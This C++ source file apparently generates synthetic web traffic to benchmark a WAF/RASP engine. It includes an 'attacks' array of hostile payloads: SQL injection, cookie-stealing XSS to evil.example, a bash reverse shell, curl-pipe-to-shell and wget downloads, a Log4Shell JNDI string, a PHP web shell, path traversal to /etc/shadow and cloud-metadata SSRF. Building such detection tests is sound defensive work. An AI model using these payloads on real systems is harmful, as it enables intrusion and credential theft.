// Unless explicitly stated otherwise all files in this repository are
// dual-licensed under the Apache-2.0 License or BSD-3-Clause License.
//
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2021 Datadog, Inc.

#include "traffic.hpp"

#include <cstdio>
#include <string_view>

#include "rng.hpp"

namespace bench {
namespace {

// ---------------------------------------------------------------------------
// Vocabulary
// ---------------------------------------------------------------------------

const std::vector<std::string> words = {"time", "year", "people", "way", "day", "thing", "life",
    "child", "world", "school", "family", "student", "group", "country", "hand", "part", "place",
    "week", "company", "system", "program", "work", "number", "night", "point", "home", "water",
    "room", "area", "money", "story", "month", "study", "book", "job", "word", "business", "issue",
    "side", "kind", "head", "house", "service", "friend", "power", "hour", "game", "line", "member",
    "city", "community", "name", "team", "minute", "idea", "body", "information", "parent", "face",
    "level", "office", "health", "person", "art", "history", "party", "result", "change", "morning",
    "reason", "research", "moment", "teacher", "education", "garden", "coffee", "recipe", "travel",
    "summer", "winter", "music", "movie", "photo", "camera", "phone", "laptop", "review", "price",
    "shipping", "delivery", "color", "size", "small", "large", "blue", "green", "red", "black",
    "white", "fresh", "organic", "handmade", "vintage", "modern", "classic", "premium", "simple",
    "easy", "quick", "best", "new", "great", "good", "little", "big", "long", "high", "different",
    "important", "kitchen", "chair", "table", "lamp", "shoes", "jacket", "shirt", "dress", "watch",
    "guide", "tips", "ideas", "weekend", "holiday", "beach", "mountain", "forest", "river", "bread",
    "cheese", "tomato", "pasta", "salad", "chicken", "baking", "cookies", "running", "cycling",
    "yoga", "fitness", "budget", "savings", "career", "interview", "design", "studio", "wedding",
    "birthday", "gift", "flower", "plants", "dog", "cat", "puppy", "kitten", "training", "update"};

const std::vector<std::string> first_names = {"john", "maria", "wei", "ahmed", "olga", "lucas",
    "aisha", "kenji", "sofia", "raj", "emma", "noah", "liam", "mia", "lena", "omar", "ines",
    "pedro", "anna", "tom"};
const std::vector<std::string> last_names = {"smith", "garcia", "li", "khan", "ivanova", "silva",
    "okafor", "tanaka", "rossi", "patel", "muller", "dubois", "jensen", "novak", "costa", "brown"};
const std::vector<std::string> mail_domains = {
    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com", "proton.me"};

const std::vector<std::string> user_agents = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 "
    "Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like "
    "Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/126.0.6478.71 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "CriOS/126.0.6478.54 Mobile/15E148 Safari/604.1",
    "okhttp/4.12.0",
};

const std::vector<std::string> languages = {"en-US,en;q=0.9", "en-GB,en;q=0.9,en-US;q=0.8",
    "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7", "de-DE,de;q=0.9,en;q=0.8", "es-ES,es;q=0.9",
    "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "ja,en-US;q=0.9,en;q=0.8"};

const std::vector<std::string> hosts = {"www.example-shop.com", "blog.example.org", "example.com",
    "app.example.net", "api.example.io"};

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

std::string join_words(rng &r, std::size_t n, char sep)
{
    std::string out;
    for (std::size_t i = 0; i < n; ++i) {
        if (i != 0) { out += sep; }
        out += r.pick(words);
    }
    return out;
}

std::string slug(rng &r) { return join_words(r, static_cast<std::size_t>(r.range(2, 6)), '-'); }

std::string sentence(rng &r, std::size_t n)
{
    std::string s = join_words(r, n, ' ');
    s[0] = static_cast<char>(s[0] - 'a' + 'A');
    s += '.';
    return s;
}

std::string paragraph(rng &r, std::size_t target_len)
{
    std::string out;
    while (out.size() < target_len) {
        if (!out.empty()) { out += ' '; }
        out += sentence(r, static_cast<std::size_t>(r.range(6, 16)));
    }
    return out;
}

std::string url_encode(std::string_view s)
{
    static constexpr char hexd[] = "0123456789ABCDEF";
    std::string out;
    out.reserve(s.size());
    for (unsigned char c : s) {
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') ||
            c == '-' || c == '_' || c == '.' || c == '~') {
            out += static_cast<char>(c);
        } else {
            out += '%';
            out += hexd[c >> 4];
            out += hexd[c & 15];
        }
    }
    return out;
}

std::string public_ipv4(rng &r)
{
    while (true) {
        const uint32_t a = static_cast<uint32_t>(r.next());
        const unsigned o1 = a >> 24;
        const unsigned o2 = (a >> 16) & 0xff;
        if (o1 == 0 || o1 == 10 || o1 == 127 || o1 >= 224 || (o1 == 169 && o2 == 254) ||
            (o1 == 172 && o2 >= 16 && o2 < 32) || (o1 == 192 && o2 == 168) ||
            (o1 == 198 && o2 == 51) || (o1 == 203 && o2 == 0) || (o1 == 100 && o2 >= 64)) {
            continue;
        }
        char buf[16];
        snprintf(buf, sizeof(buf), "%u.%u.%u.%u", o1, o2, (a >> 8) & 0xff, a & 0xff);
        return buf;
    }
}

std::string public_ipv6(rng &r)
{
    char buf[48];
    snprintf(buf, sizeof(buf), "2a0%x:%x:%x:%x::%x", static_cast<unsigned>(r.below(16)),
        static_cast<unsigned>(r.below(0x10000)), static_cast<unsigned>(r.below(0x10000)),
        static_cast<unsigned>(r.below(0x10000)), static_cast<unsigned>(r.range(1, 0xffff)));
    return buf;
}

std::string email(rng &r)
{
    return r.pick(first_names) + "." + r.pick(last_names) + std::to_string(r.below(1000)) + "@" +
           r.pick(mail_domains);
}

std::string jwt(rng &r)
{
    const std::string header = R"({"alg":"RS256","typ":"JWT","kid":")" + r.hex(40) + R"("})";
    const int64_t iat = 1717000000 + r.range(0, 1000000);
    const std::string payload = R"({"iss":"https://auth.example.com/","sub":"auth0|)" + r.hex(24) +
                                R"(","aud":["https://api.example.com","https://example.eu.auth0.com/userinfo"],"iat":)" +
                                std::to_string(iat) + R"(,"exp":)" + std::to_string(iat + 86400) +
                                R"(,"scope":"openid profile email read:orders write:orders","azp":")" +
                                r.alnum(32) +
                                R"(","permissions":["read:orders","write:orders","read:profile"]})";
    return rng::encode_base64(header, true) + "." + rng::encode_base64(payload, true) + "." +
           r.base64(256, true);
}

std::string traceparent(rng &r) { return "00-" + r.hex(32) + "-" + r.hex(16) + "-01"; }

// ---------------------------------------------------------------------------
// HTTP request model
// ---------------------------------------------------------------------------

struct http_request {
    std::string method{"GET"};
    std::string host;
    std::string path{"/"};
    node query = node::map();
    node cookies = node::map();
    node headers = node::map();
    node body = node::map();
    std::string body_raw_type; // content type, empty when no body
    std::size_t body_raw_size{0};
    node filenames = node::array();
    node file_fields = node::array();
    std::string client_ip;
    node route_params; // null when the framework doesn't push them
    std::vector<node> rasp; // transient subcontext payloads
    std::size_t login_at{SIZE_MAX}; // index into rasp of the login event
    std::string status{"200"};
    node resp_headers = node::map();
    node resp_body; // null when not parsed (HTML, redirects)
    bool schema{false};
};

void append_query_string(std::string &out, const std::string &prefix, const node &v)
{
    if (v.is_map()) {
        for (const auto &[k, c] : v.obj) {
            append_query_string(out, prefix.empty() ? k : prefix + "[" + k + "]", c);
        }
    } else if (v.is_array()) {
        for (const auto &c : v.arr) { append_query_string(out, prefix + "[]", c); }
    } else {
        if (!out.empty()) { out += '&'; }
        out += url_encode(prefix);
        out += '=';
        out += url_encode(v.s);
    }
}

std::string url_decode(std::string_view s)
{
    std::string out;
    out.reserve(s.size());
    for (std::size_t i = 0; i < s.size(); ++i) {
        if (s[i] == '%' && i + 2 < s.size()) {
            auto hexv = [](char c) -> int {
                if (c >= '0' && c <= '9') { return c - '0'; }
                if (c >= 'a' && c <= 'f') { return c - 'a' + 10; }
                if (c >= 'A' && c <= 'F') { return c - 'A' + 10; }
                return -1;
            };
            const int hi = hexv(s[i + 1]);
            const int lo = hexv(s[i + 2]);
            if (hi >= 0 && lo >= 0) {
                out += static_cast<char>(hi << 4 | lo);
                i += 2;
                continue;
            }
        }
        out += s[i];
    }
    return out;
}

// Same as _pack_path_params in dd-trace-php request_init.c
node path_params_of(std::string_view uri)
{
    node arr = node::array();
    std::size_t p = 0;
    if (!uri.empty() && uri[0] == '/') { p = 1; }
    std::size_t beg = p;
    for (;; ++p) {
        const bool terminates = p >= uri.size() || uri[p] == '?';
        if (!terminates && uri[p] != '/') { continue; }
        const std::size_t len = p - beg;
        if (len == 0 && terminates) { break; }
        arr.add(node::str(url_decode(uri.substr(beg, len))));
        if (terminates) { break; }
        beg = p + 1;
    }
    return arr;
}

void base_headers(rng &r, http_request &req, bool browser, bool large)
{
    auto &h = req.headers;
    h.set("host", req.host);
    const std::string ua = r.pick(user_agents);
    if (browser) {
        h.set("connection", "keep-alive");
        if (ua.find("Chrome") != std::string::npos) {
            h.set("sec-ch-ua",
                R"("Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126")");
            h.set("sec-ch-ua-mobile", ua.find("Mobile") != std::string::npos ? "?1" : "?0");
            h.set("sec-ch-ua-platform", R"("Windows")");
        }
        h.set("upgrade-insecure-requests", "1");
        h.set("user-agent", ua);
        h.set("accept",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/"
            "apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
        h.set("sec-fetch-site", r.chance(1, 2) ? "same-origin" : "none");
        h.set("sec-fetch-mode", "navigate");
        h.set("sec-fetch-user", "?1");
        h.set("sec-fetch-dest", "document");
        if (r.chance(2, 3)) {
            h.set("referer", "https://" + req.host + "/" + slug(r) + "/");
        }
        h.set("accept-encoding", "gzip, deflate, br, zstd");
        h.set("accept-language", r.pick(languages));
    } else {
        h.set("user-agent", ua);
        h.set("accept", "application/json, text/plain, */*");
        h.set("accept-encoding", "gzip, deflate, br");
        h.set("accept-language", r.pick(languages));
        h.set("origin", "https://" + req.host);
        h.set("referer", "https://" + req.host + "/" + slug(r));
        h.set("x-requested-with", "XMLHttpRequest");
    }
    // Load balancer / proxy headers
    h.set("x-forwarded-for", req.client_ip + ", 10.0." + std::to_string(r.below(256)) + "." +
                                 std::to_string(r.range(1, 254)));
    h.set("x-forwarded-proto", "https");
    h.set("x-forwarded-port", "443");
    h.set("x-amzn-trace-id", "Root=1-" + r.hex(8) + "-" + r.hex(24));
    // Distributed tracing headers injected by upstream services
    h.set("x-datadog-trace-id", std::to_string(r.next() >> 1));
    h.set("x-datadog-parent-id", std::to_string(r.next() >> 1));
    h.set("x-datadog-sampling-priority", "1");
    h.set("traceparent", traceparent(r));
    if (large) {
        h.set("x-datadog-tags", "_dd.p.dm=-1,_dd.p.tid=" + r.hex(16) + ",_dd.p.usr.id=" + r.base64(18));
        h.set("tracestate", "dd=s:1;p:" + r.hex(16) + ";t.dm:-1;t.tid:" + r.hex(16));
        h.set("baggage", "session.id=" + r.uuid() + ",account.tier=premium,experiment.cohort=" +
                             r.alnum(12) + ",feature.flags=" + join_words(r, 12, '|'));
        h.set("x-request-id", r.uuid());
        h.set("x-real-ip", req.client_ip);
        h.set("authorization", "Bearer " + jwt(r));
        h.set("x-csrf-token", r.base64(30));
        h.set("cache-control", "no-cache");
        h.set("pragma", "no-cache");
        h.set("dnt", "1");
        h.set("priority", "u=0, i");
        h.set("if-none-match", "W/\"" + r.hex(32) + "\"");
        h.set("x-client-version", "web-" + std::to_string(r.range(100, 999)) + "." + r.hex(7));
        h.set("cdn-loop", "cloudflare; loops=1");
        h.set("cf-ray", r.hex(16) + "-CDG");
        h.set("cf-ipcountry", "FR");
        h.set("cf-visitor", R"({"scheme":"https"})");
        h.set("cf-connecting-ip", req.client_ip);
        h.set("true-client-ip", req.client_ip);
        h.set("x-forwarded-host", req.host);
    }
}

void base_cookies(rng &r, http_request &req, bool large)
{
    auto &c = req.cookies;
    if (r.chance(4, 5)) { c.set("PHPSESSID", r.alnum(26)); }
    c.set("_ga", "GA1.1." + std::to_string(r.range(100000000, 999999999)) + "." +
                     std::to_string(r.range(1700000000, 1720000000)));
    if (r.chance(1, 2)) {
        c.set("_ga_" + r.alnum(10), "GS1.1." + std::to_string(r.range(1700000000, 1720000000)) +
                                        ".12.1." + std::to_string(r.range(1700000000, 1720000000)) +
                                        ".0.0.0");
    }
    if (r.chance(1, 2)) { c.set("_gid", "GA1.2." + std::to_string(r.range(100000000, 999999999))); }
    if (r.chance(1, 3)) {
        c.set("_fbp", "fb.1." + std::to_string(r.range(100000000, 999999999)) + "." +
                          std::to_string(r.range(100000000, 999999999)));
    }
    if (!large) { return; }
    c.set("laravel_session", r.base64(240));
    c.set("XSRF-TOKEN", r.base64(256));
    c.set("_gcl_au", "1.1." + std::to_string(r.range(100000000, 999999999)) + "." +
                         std::to_string(r.range(1700000000, 1720000000)));
    c.set("OptanonConsent",
        url_encode("isGpcEnabled=0&datestamp=Mon Jun 03 2024 10:12:44 GMT+0200&version=202401.2.0"
                   "&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=" +
                   r.uuid() +
                   "&interactionCount=1&landingPath=NotLandingPage&groups=C0001:1,C0002:1,C0003:1,"
                   "C0004:0,C0005:1&AwaitingReconsent=false&geolocation=FR;IDF"));
    c.set("OptanonAlertBoxClosed", "2024-06-03T08:12:44.123Z");
    c.set("wordpress_logged_in_" + r.hex(32),
        r.pick(first_names) + "%7C" + std::to_string(r.range(1700000000, 1720000000)) + "%7C" +
            r.alnum(43) + "%7C" + r.hex(64));
    c.set("wp-settings-1", "libraryContent%3Dbrowse%26editor%3Dtinymce%26mfold%3Do");
    c.set("wp-settings-time-1", std::to_string(r.range(1700000000, 1720000000)));
    c.set("ajs_anonymous_id", r.uuid());
    c.set("ajs_user_id", std::to_string(r.range(1, 999999)));
    c.set("intercom-session-" + r.alnum(8), r.base64(120));
    c.set("intercom-device-id-" + r.alnum(8), r.uuid());
    c.set("AMP_" + r.hex(10), r.base64(300));
    c.set("_hjSessionUser_" + std::to_string(r.range(100000, 999999)), r.base64(90));
    c.set("cf_clearance", r.alnum(43) + "-" + std::to_string(r.range(1700000000, 1720000000)) +
                              "-1.0.1.1-" + r.alnum(120));
    c.set("__stripe_mid", r.uuid() + r.hex(6));
    c.set("__stripe_sid", r.uuid() + r.hex(6));
    c.set("locale", "en_US");
    c.set("currency", "EUR");
    // Cart state serialised client side (url-encoded JSON)
    std::string cart = R"({"items":[)";
    const auto n = r.range(5, 25);
    for (int64_t i = 0; i < n; ++i) {
        if (i != 0) { cart += ','; }
        cart += R"({"sku":")" + r.alnum(10) + R"(","qty":)" + std::to_string(r.range(1, 4)) +
                R"(,"name":")" + join_words(r, 3, ' ') + R"("})";
    }
    cart += "]}";
    c.set("cart", url_encode(cart));
}

void html_response(rng &r, http_request &req, bool large)
{
    auto &h = req.resp_headers;
    h.set("content-type", node::array()).add(node::str("text/html; charset=UTF-8"));
    h.set("cache-control", node::array()).add(node::str("no-cache, must-revalidate, max-age=0"));
    h.set("x-powered-by", node::array()).add(node::str("PHP/8.3.12"));
    h.set("vary", node::array()).add(node::str("Accept-Encoding"));
    h.set("link", node::array())
        .add(node::str("<https://" + req.host + "/wp-json/>; rel=\"https://api.w.org/\""));
    if (large) {
        h.set("x-frame-options", node::array()).add(node::str("SAMEORIGIN"));
        h.set("strict-transport-security", node::array())
            .add(node::str("max-age=31536000; includeSubDomains"));
        h.set("content-security-policy", node::array())
            .add(node::str("default-src 'self'; script-src 'self' 'nonce-" + r.base64(16) +
                           "' https://www.googletagmanager.com; img-src * data:; style-src "
                           "'self' 'unsafe-inline'"));
        h.set("x-content-type-options", node::array()).add(node::str("nosniff"));
        h.set("expires", node::array()).add(node::str("Wed, 11 Jan 1984 05:00:00 GMT"));
    }
}

void json_response_headers(rng &r, http_request &req)
{
    auto &h = req.resp_headers;
    h.set("content-type", node::array()).add(node::str("application/json"));
    h.set("cache-control", node::array()).add(node::str("private, must-revalidate"));
    h.set("x-ratelimit-limit", node::array()).add(node::str("60"));
    h.set("x-ratelimit-remaining", node::array()).add(node::str(std::to_string(r.range(0, 59))));
    h.set("vary", node::array()).add(node::str("Origin"));
    h.set("access-control-allow-origin", node::array()).add(node::str("https://" + req.host));
}

node product(rng &r, int64_t id, bool detailed)
{
    node p = node::map();
    p.set("id", node::integer(id));
    const std::string s = slug(r);
    p.set("name", sentence(r, 3));
    p.set("slug", s);
    p.set("sku", r.alnum(10));
    p.set("price", std::to_string(r.range(1, 999)) + "." + std::to_string(r.range(10, 99)));
    p.set("currency", "EUR");
    p.set("in_stock", node::boolean(r.chance(4, 5)));
    p.set("rating", node::integer(r.range(1, 5)));
    if (detailed) {
        p.set("description", paragraph(r, static_cast<std::size_t>(r.range(150, 600))));
        auto &img = p.set("images", node::array());
        for (int64_t i = 0; i < r.range(1, 4); ++i) {
            img.add(node::str("https://cdn.example-shop.com/images/" + r.hex(16) + "/" + s + "-" +
                              std::to_string(i) + ".webp"));
        }
        auto &tags = p.set("tags", node::array());
        for (int64_t i = 0; i < r.range(2, 6); ++i) { tags.add(node::str(r.pick(words))); }
        auto &attrs = p.set("attributes", node::map());
        attrs.set("color", r.pick(words));
        attrs.set("size", std::string(1, "SMLX"[r.below(4)]));
        attrs.set("material", r.pick(words));
    }
    return p;
}

// ---------------------------------------------------------------------------
// RASP payloads (pushed through transient subcontexts)
// ---------------------------------------------------------------------------

node sql_event(std::string statement, const char *system = "mysql")
{
    node n = node::map();
    n.set("server.db.statement", std::move(statement));
    n.set("server.db.system", system);
    return n;
}

node file_event(std::string path)
{
    node n = node::map();
    n.set("server.io.fs.file", std::move(path));
    return n;
}

node url_event(std::string url)
{
    node n = node::map();
    n.set("server.io.net.url", std::move(url));
    return n;
}

std::string wp_sql(rng &r, const std::string &slug_value, const std::string &search)
{
    switch (r.below(12)) {
    case 0:
        return "SELECT option_name, option_value FROM wp_options WHERE autoload IN ('yes', 'on', "
               "'auto-on', 'auto')";
    case 1:
        return "SELECT * FROM wp_users WHERE ID = '" + std::to_string(r.range(1, 5000)) +
               "' LIMIT 1";
    case 2:
        return "SELECT wp_posts.* FROM wp_posts WHERE 1=1 AND wp_posts.post_name = '" + slug_value +
               "' AND wp_posts.post_type = 'post' ORDER BY wp_posts.post_date DESC";
    case 3:
        return "SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON "
               "t.term_id = tt.term_id WHERE tt.taxonomy IN ('category') AND t.slug = '" +
               r.pick(words) + "'";
    case 4: {
        std::string ids;
        for (int64_t i = 0; i < r.range(3, 20); ++i) {
            if (i != 0) { ids += ','; }
            ids += std::to_string(r.range(1, 90000));
        }
        return "SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN (" + ids +
               ") ORDER BY meta_id ASC";
    }
    case 5:
        if (!search.empty()) {
            return "SELECT SQL_CALC_FOUND_ROWS wp_posts.ID FROM wp_posts WHERE 1=1 AND "
                   "(((wp_posts.post_title LIKE '%" +
                   search + "%') OR (wp_posts.post_excerpt LIKE '%" + search +
                   "%') OR (wp_posts.post_content LIKE '%" + search +
                   "%'))) AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = "
                   "'publish'))) ORDER BY wp_posts.post_title LIKE '%" +
                   search + "%' DESC, wp_posts.post_date DESC LIMIT 0, 10";
        }
        [[fallthrough]];
    case 6:
        return "UPDATE `wp_options` SET `option_value` = '" +
               std::to_string(r.range(1717000000, 1718000000)) +
               "' WHERE `option_name` = '_transient_timeout_feed_" + r.hex(32) + "'";
    case 7:
        return "SELECT wp_comments.comment_ID FROM wp_comments WHERE ( comment_approved = '1' ) "
               "AND comment_post_ID = " +
               std::to_string(r.range(1, 90000)) + " AND comment_parent = 0 ORDER BY "
               "wp_comments.comment_date_gmt ASC, wp_comments.comment_ID ASC";
    case 8:
        return "SELECT object_id, term_taxonomy_id FROM wp_term_relationships INNER JOIN "
               "wp_posts ON object_id = ID WHERE term_taxonomy_id IN (" +
               std::to_string(r.range(1, 300)) + "," + std::to_string(r.range(1, 300)) +
               ") AND post_type IN ('post') AND post_status = 'publish'";
    case 9:
        return "SELECT * FROM wp_woocommerce_sessions WHERE session_key = '" + r.hex(32) + "'";
    case 10:
        return "INSERT INTO `wp_options` (`option_name`, `option_value`, `autoload`) VALUES "
               "('_transient_wc_count_comments', 'a:7:{s:5:\"total_comments\";i:" +
               std::to_string(r.range(0, 900)) + ";}', 'off') ON DUPLICATE KEY UPDATE "
               "`option_name` = VALUES(`option_name`), `option_value` = VALUES(`option_value`)";
    default:
        return "SELECT wp_posts.ID FROM wp_posts WHERE 1=1 AND wp_posts.post_type = 'product' "
               "AND ((wp_posts.post_status = 'publish')) ORDER BY wp_posts.menu_order ASC, "
               "wp_posts.post_title ASC LIMIT 0, " +
               std::to_string(r.range(4, 48));
    }
}

std::string laravel_sql(rng &r)
{
    switch (r.below(8)) {
    case 0: return "select * from `users` where `id` = ? limit 1";
    case 1:
        return "select * from `products` where `slug` = ? and `products`.`deleted_at` is null "
               "limit 1";
    case 2: return "select count(*) as aggregate from `orders` where `user_id` = ?";
    case 3:
        return "insert into `sessions` (`id`, `payload`, `last_activity`, `user_id`, "
               "`ip_address`, `user_agent`) values (?, ?, ?, ?, ?, ?)";
    case 4:
        return "select `categories`.*, `category_product`.`product_id` as `pivot_product_id` from "
               "`categories` inner join `category_product` on `categories`.`id` = "
               "`category_product`.`category_id` where `category_product`.`product_id` in (" +
               std::to_string(r.range(1, 9000)) + ", " + std::to_string(r.range(1, 9000)) + ")";
    case 5:
        return "update `users` set `last_seen_at` = ?, `users`.`updated_at` = ? where `id` = ?";
    case 6:
        return R"(SELECT "orders".* FROM "orders" WHERE "orders"."customer_id" = $1 ORDER BY "orders"."created_at" DESC LIMIT $2)";
    default: return "select * from `cache` where `key` in (?)";
    }
}

const char *php_files[] = {"/var/www/html/wp-content/themes/twentytwentyfour/functions.php",
    "/var/www/html/wp-content/themes/twentytwentyfour/templates/single.html",
    "/var/www/html/wp-content/plugins/woocommerce/templates/single-product.php",
    "/var/www/html/wp-content/uploads/2024/05/manifest.json",
    "/var/www/app/storage/framework/views/3f8a2c1d9e0b7a6f5c4d3e2b1a0f9e8d.php",
    "/var/www/app/resources/lang/en/messages.php", "/var/www/app/config/app.php",
    "/var/www/app/storage/framework/cache/data/ab/cd/abcd1234ef567890",
    "/tmp/php_sess_cache.json", "/var/www/html/wp-content/languages/en_US.mo"};

const char *outbound_urls[] = {"https://api.stripe.com/v1/payment_intents",
    "https://maps.googleapis.com/maps/api/geocode/json",
    "https://api.mailgun.net/v3/mg.example.com/messages", "https://hooks.slack.com/services/T000",
    "https://www.google.com/recaptcha/api/siteverify", "https://api.github.com/repos/foo/bar"};

// ---------------------------------------------------------------------------
// Attack payloads
// ---------------------------------------------------------------------------

enum class attack_kind : uint8_t { sqli, xss, lfi, rce, ssrf, ssti, php, nosql };

struct attack {
    attack_kind kind;
    const char *payload;
};

const attack attacks[] = {
    {attack_kind::sqli, "1' OR '1'='1"},
    {attack_kind::sqli, "-1' UNION SELECT NULL,table_name FROM information_schema.tables-- -"},
    {attack_kind::sqli, "1' AND SLEEP(5) AND 'a'='a"},
    {attack_kind::sqli,
        "1 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM "
        "information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#"},
    {attack_kind::sqli, "1' AND extractvalue(1,concat(0x7e,(select user()),0x7e))-- -"},
    {attack_kind::sqli, "-1' UNION ALL SELECT NULL,CONCAT(0x7176,user(),0x7176),NULL-- -"},
    {attack_kind::xss, "<script>alert(document.cookie)</script>"},
    {attack_kind::xss, "\"><img src=x onerror=alert(1)>"},
    {attack_kind::xss, "javascript:alert(1)"},
    {attack_kind::xss, "<svg/onload=fetch('//evil.example/'+document.cookie)>"},
    {attack_kind::lfi, "../../../../etc/passwd"},
    {attack_kind::lfi, "....//....//....//etc/shadow"},
    {attack_kind::lfi, "/proc/self/environ"},
    {attack_kind::php, "php://filter/convert.base64-encode/resource=index.php"},
    {attack_kind::rce, "; cat /etc/passwd"},
    {attack_kind::rce, "1;/bin/bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"},
    {attack_kind::rce, "$(curl -s http://evil.example/x.sh | sh)"},
    {attack_kind::rce, "`wget http://evil.example/shell -O /tmp/s`"},
    {attack_kind::ssrf, "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
    {attack_kind::ssrf, "http://127.0.0.1:8080/admin"},
    {attack_kind::ssti, "${jndi:ldap://evil.example/a}"},
    {attack_kind::ssti, "{{7*7}}${7*7}<%= 7*7 %>"},
    {attack_kind::php, "<?php system($_GET['c']); ?>"},
    {attack_kind::nosql, "$ne"},
};

const std::vector<std::string> scanner_uas = {
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007036)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/74.0.3729.169 Safari/537.36 Nuclei - Open-source project (github.com/projectdiscovery/"
    "nuclei)",
    "Fuzz Faster U Fool v2.1.0-dev",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
};

// ---------------------------------------------------------------------------
// Request templates
// ---------------------------------------------------------------------------

std::string search_terms(rng &r) { return join_words(r, static_cast<std::size_t>(r.range(1, 3)), ' '); }

void utm(rng &r, node &q)
{
    if (r.chance(1, 4)) {
        q.set("utm_source", r.pick(std::vector<std::string>{"google", "newsletter", "facebook", "twitter"}));
        q.set("utm_medium", r.pick(std::vector<std::string>{"cpc", "email", "social"}));
        q.set("utm_campaign", join_words(r, 2, '_') + "_" + std::to_string(r.range(2023, 2024)));
    }
    if (r.chance(1, 8)) { q.set("gclid", r.alnum(r.range(60, 90))); }
    if (r.chance(1, 10)) { q.set("fbclid", "IwAR" + r.alnum(r.range(50, 70))); }
}

// A page rendered by a CMS (WordPress-like) or an MVC framework (Laravel-like).
void page_get(rng &r, http_request &req, bool large)
{
    std::string search;
    switch (r.below(6)) {
    case 0: req.path = "/"; break;
    case 1: {
        const std::string s = slug(r);
        req.path = "/" + std::to_string(r.range(2019, 2024)) + "/" +
                   std::to_string(r.range(10, 12)) + "/" + s + "/";
        req.route_params = node::map();
        req.route_params.set("slug", s);
        break;
    }
    case 2: {
        const std::string s = slug(r);
        req.path = "/product/" + s;
        req.route_params = node::map();
        req.route_params.set("product", s);
        if (r.chance(1, 3)) { req.query.set("variant", std::to_string(r.range(1, 9999))); }
        break;
    }
    case 3: {
        const std::string c = r.pick(words);
        req.path = "/category/" + c + "/";
        req.route_params = node::map();
        req.route_params.set("category", c);
        req.query.set("page", std::to_string(r.range(2, 20)));
        if (r.chance(1, 2)) { req.query.set("orderby", r.chance(1, 2) ? "price" : "popularity"); }
        break;
    }
    case 4:
        req.path = "/";
        search = search_terms(r);
        req.query.set("s", search);
        if (r.chance(1, 2)) { req.query.set("post_type", "product"); }
        break;
    default: {
        const auto id = std::to_string(r.range(1, 99999));
        req.path = "/account/orders/" + id;
        req.route_params = node::map();
        req.route_params.set("order", id);
        break;
    }
    }
    utm(r, req.query);
    if (large) {
        // Faceted search pages produce long query strings
        auto &filter = req.query.set("filter", node::map());
        for (int64_t i = 0; i < r.range(10, 25); ++i) {
            auto &arr = filter.set(r.pick(words) + "_" + std::to_string(i), node::array());
            for (int64_t j = 0; j < r.range(1, 6); ++j) { arr.add(node::str(r.pick(words))); }
        }
        for (int64_t i = 0; i < r.range(10, 30); ++i) {
            req.query.set("f_" + r.pick(words) + std::to_string(i), r.pick(words));
        }
        req.query.set("q", paragraph(r, static_cast<std::size_t>(r.range(100, 400))));
        req.query.set("return_to", "https://" + req.host + "/" + slug(r) + "?" + "ref=" +
                                       r.alnum(20) + "&session=" + r.base64(64, true));
        req.query.set("state", r.base64(r.range(300, 900), true));
    }
    html_response(r, req, large);
    req.status = r.chance(1, 30) ? "404" : "200";

    // RASP: SQL queries done while rendering
    const std::string sv = req.route_params.is_map() && !req.route_params.obj.empty()
                               ? req.route_params.obj[0].second.s
                               : slug(r);
    const int64_t queries = large ? r.range(8, 15) : r.range(1, 6);
    for (int64_t i = 0; i < queries; ++i) {
        req.rasp.push_back(sql_event(r.chance(2, 3) ? wp_sql(r, sv, search) : laravel_sql(r)));
    }
    for (int64_t i = 0; i < (large ? r.range(2, 4) : r.range(0, 2)); ++i) {
        req.rasp.push_back(file_event(r.pick(php_files)));
    }
}

void ajax_post(rng &r, http_request &req)
{
    req.method = "POST";
    req.path = "/wp-admin/admin-ajax.php";
    req.body_raw_type = "application/x-www-form-urlencoded; charset=UTF-8";
